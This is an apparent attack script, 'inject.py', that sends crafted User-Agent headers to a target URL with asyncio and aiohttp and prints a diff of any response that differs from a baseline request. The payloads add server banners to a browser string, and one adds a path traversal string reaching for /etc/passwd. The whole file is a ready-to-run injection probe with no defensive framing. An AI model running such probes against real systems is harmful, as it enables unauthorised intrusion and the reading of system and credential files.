import aiohttp
import asyncio
import difflib
import sys
print("python3 inject.py url")
url = sys.argv[1]
payloads = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36; Apache/2.4.46",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36; Windows",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/536.36; PHP/7.4.12",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36; ../../../etc/passwd"
]

async def send_request(session, payload = None):
    headers = {}
    if payload:
        headers = {"User-Agent": payload}
    async with session.get(url, headers=headers) as response:
        return await response.text()

async def main():
    async with aiohttp.ClientSession() as session:
        regular_response = await send_request(session)
        tasks = [asyncio.ensure_future(send_request(session, payload)) for payload in payloads]
        results = await asyncio.gather(*tasks)
        for result, payload in zip(results, payloads):
            if result != regular_response:
                print("Payload: {}".format(payload))
                for line in difflib.unified_diff(regular_response.splitlines(), result.splitlines()):
                    print(line)
                print()

loop = asyncio.get_event_loop()
loop.run_until_complete(main())
